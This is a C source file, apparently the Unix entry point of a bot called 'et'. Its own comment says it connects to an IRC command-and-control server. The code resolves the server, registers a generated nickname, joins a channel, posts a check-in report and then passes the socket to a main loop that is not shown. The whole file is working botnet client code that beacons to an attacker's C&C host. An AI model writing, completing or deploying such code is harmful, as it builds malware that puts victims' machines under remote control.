/*	et_nix.c
	Author: William Woodruff
	------------------------
	The starting point for et on *nix systems.
	Connects to the IRC C&C server, says hello, then calls et_main_loop.
*/

#include "../et_main_loop.h"
#include "../gen_nick.h"
#include "../cnc_info.h"
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <unistd.h>

int main(int argc, char **argv[])
{
	char nick_str[256];
	char user_str[256];
	char join_str[256];
	char mesg_str[256];

	int sock;
	struct sockaddr_in server;
	struct hostent *host;

	host = gethostbyname(IRC_SERVER);
	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&server, 0, sizeof(struct sockaddr_in));
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = *((unsigned long *) host->h_addr_list[0]);
	server.sin_port = htons(IRC_PORT);

	connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_in));

	char *nick = gen_nick();
	snprintf(nick_str, 256, "%s%s%s", "NICK ", nick, "\r\n");
	snprintf(user_str, 256, "%s%s%s", "USER ", nick, " 0 * :et phone home\r\n");
	snprintf(join_str, 256, "%s%s%s", "JOIN :", IRC_CHANNEL, "\r\n");
	snprintf(mesg_str, 256, "%s%s%s%s%s%s%s", "PRIVMSG ", IRC_CHANNEL, " :", nick, " ", IRC_REPORT, "\r\n");
	char *quit = "QUIT";

	send(sock, nick_str, strlen(nick_str), 0);
	send(sock, user_str, strlen(user_str), 0);
	send(sock, join_str, strlen(join_str), 0);
	send(sock, mesg_str, strlen(mesg_str), 0);
	send(sock, quit, strlen(quit), 0);

	et_main_loop(sock);

	close(sock);
	return 0;
}